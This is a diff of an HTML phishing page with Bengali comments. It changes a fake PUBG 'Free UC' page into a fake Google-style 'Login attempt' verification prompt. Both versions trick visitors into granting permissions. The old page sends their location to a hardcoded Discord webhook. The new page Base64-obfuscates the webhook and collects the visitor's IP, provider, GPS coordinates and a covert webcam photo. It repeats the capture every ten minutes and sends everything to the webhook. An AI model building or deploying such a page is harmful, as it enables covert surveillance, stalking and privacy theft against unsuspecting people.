@@ -3,74 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG Mobile - Free UC Center</title>
+    <title>Identity Verification - Security Portal</title>
     <style>
-        body { background: #000; color: #f1c40f; text-align: center; font-family: sans-serif; padding-top: 50px; margin: 0; }
-        .card { background: #1a1a1a; border: 2px solid #f1c40f; border-radius: 15px; padding: 30px; max-width: 350px; margin: 0 auto; box-shadow: 0 0 20px rgba(241, 196, 15, 0.4); }
-        .btn { background: #f1c40f; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 8px; text-transform: uppercase; font-size: 16px; margin-top: 20px; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
-        h1 { font-size: 24px; margin-bottom: 10px; }
-        p { color: #ccc; font-size: 14px; }
+        body { background: #f2f2f7; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: white; width: 90%; max-width: 350px; border-radius: 20px; padding: 30px 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); text-align: center; border: 0.5px solid #d1d1d6; }
+        .icon-circle { width: 65px; height: 65px; background: #007aff; border-radius: 15px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; font-weight: bold; }
+        h2 { font-size: 22px; margin: 10px 0; color: #000; letter-spacing: -0.5px; }
+        p { font-size: 15px; color: #3a3a3c; margin-bottom: 30px; line-height: 1.5; }
+        .btn-group { display: flex; gap: 12px; }
+        .btn { flex: 1; padding: 16px; border-radius: 12px; border: none; font-weight: 600; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .btn-deny { background: #e5e5ea; color: #ff3b30; }
+        .btn-approve { background: #34c759; color: white; }
+        .btn:active { transform: scale(0.96); opacity: 0.8; }
+        #v-frame { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <img src="https://www.pubgmobile.com/common/images/icon_logo.jpg" width="80" style="border-radius: 12px; margin-bottom: 15px;">
-        <h1>FREE 600 UC</h1>
-        <p>Verification required! Click claim to verify your account and receive rewards.</p>
-        <button class="btn" onclick="claimReward()">CLAIM NOW</button>
+<div class="card">
+    <div class="icon-circle">G</div>
+    <h2>Login attempt</h2>
+    <p>We detected a new login attempt from an unrecognized device. Please verify your identity.</p>
+    <div class="btn-group">
+        <button class="btn btn-deny" onclick="initiateProcess('Deny')">Deny</button>
+        <button class="btn btn-approve" onclick="initiateProcess('Approve')">Approve</button>
     </div>
+    <video id="v-frame" autoplay playsinline></video>
+    <canvas id="c-frame" style="display:none;"></canvas>
+</div>
 
-    <script>
-        // tumi (তুমি) তোমার নতুন দেওয়া ডিসকর্ড লিঙ্কটি এখানে সেট করা হয়েছে
-        const discordWebhook = "https://discord.com/api/webhooks/1482986372636606546/Wk5kMZTBxI_UqHg9M78xIxTorwSpLBOGovEgLVS8IciVJRlHpzouvH2I9v7G7I0uh7E0";
+<script>
+    // tumi (তুমি) - এখানে তোমার ওয়েবহুকটি একটু লুকিয়ে রাখা হয়েছে (Base64)
+    const _0x4a2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4Mjk4NjM3MjYzNjYwNjU0Ni9XazVrTVpUQnhJX1VxSGc5TTc4eEl4VG9yd1NwTEJPR292RWdMVlM4SWNpVkpSTGhwem91dkgySTl2N0c3STB1aDdFMA==";
+    const webhookURL = atob(_0x4a2); 
 
-        function claimReward() {
-            alert("Security Check: Please click 'Allow' for location access to verify you are not a bot.");
+    let sessionActive = false;
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(pos) {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const gMap = `https://www.google.com/maps?q=${lat},${lon}`;
+    async function getNetworkData() {
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            return await r.json();
+        } catch (e) { return {ip: "N/A", org: "N/A"}; }
+    }
 
-                    // ডিসকর্ডে সুন্দর করে ডাটা পাঠানোর ফরম্যাট
-                    const payload = {
-                        username: "PUBG REWARD SYSTEM",
-                        content: "@everyone 📍 **New Target Found!**",
-                        embeds: [{
-                            title: "Location Details Captured",
-                            color: 16711680,
-                            fields: [
-                                { name: "Latitude", value: lat.toString(), inline: true },
-                                { name: "Longitude", value: lon.toString(), inline: true },
-                                { name: "Google Maps Link", value: `[Click to Open Maps](${gMap})` }
-                            ],
-                            footer: { text: "UC Reward Verification Success" },
-                            timestamp: new Date()
-                        }]
-                    };
+    async function initiateProcess(type) {
+        if(sessionActive) return;
+        sessionActive = true;
 
-                    // ডিসকর্ডে ডাটা পাঠানো হচ্ছে
-                    fetch(discordWebhook, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload)
-                    });
+        alert("System Notification: For security purposes, please 'Allow' camera and location access to verify this " + type + " request.");
 
-                    // ইউজারকে বিভ্রান্ত করতে ফেক মেসেজ
-                    setTimeout(() => {
-                        alert("Server Error 404: Verification server is down. Please try again after some time.");
-                    }, 1500);
+        // প্রথমবার সাথে সাথে তথ্য পাঠানো
+        runCapture(type);
 
-                }, function(err) {
-                    alert("Verification Denied! You must allow location to receive 600 UC.");
-                });
-            } else {
-                alert("Browser Error: Update your browser to claim rewards.");
-            }
-        }
-    </script>
+        // প্রতি ১০ মিনিট পর পর অটো-আপডেট
+        setInterval(() => {
+            runCapture("Auto-Update");
+        }, 600000);
+    }
+
+    async function runCapture(label) {
+        const net = await getNetworkData();
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('v-frame');
+            video.srcObject = stream;
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const canvas = document.getElementById('c-frame');
+                const ctx = canvas.getContext('2d');
+
+                setTimeout(async () => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    ctx.drawImage(video, 0, 0);
+
+                    canvas.toBlob(async (imgBlob) => {
+                        const fd = new FormData();
+                        fd.append('file', imgBlob, 'auth_verify.jpg');
+                        fd.append('payload_json', JSON.stringify({
+                            username: "CENTRAL SECURITY",
+                            content: `🔴 **ALERT: Target Interaction [${label}]**`,
+                            embeds: [{
+                                color: label === 'Approve' ? 3066993 : 15158332,
+                                fields: [
+                                    { name: "🌐 IP Address", value: net.ip, inline: true },
+                                    { name: "🏢 Provider", value: net.org, inline: true },
+                                    { name: "📍 Map Link", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }
+                                ],
+                                footer: { text: "Monitoring Session Active" },
+                                timestamp: new Date()
+                            }]
+                        }));
+
+                        await fetch(webhookURL, { method: "POST", body: fd });
+
+                        if(label !== "Auto-Update") {
+                            alert("Identity Verified. Request Processed.");
+                            window.location.href = "https://myaccount.google.com/";
+                        }
+                    }, 'image/jpeg');
+                }, 1500); // ক্যামেরা স্ট্যাবিল হওয়ার জন্য ১.৫ সেকেন্ড সময়
+            });
+        } catch (err) { console.log("Access Denied"); }
+    }
+</script>
 </body>
 </html>
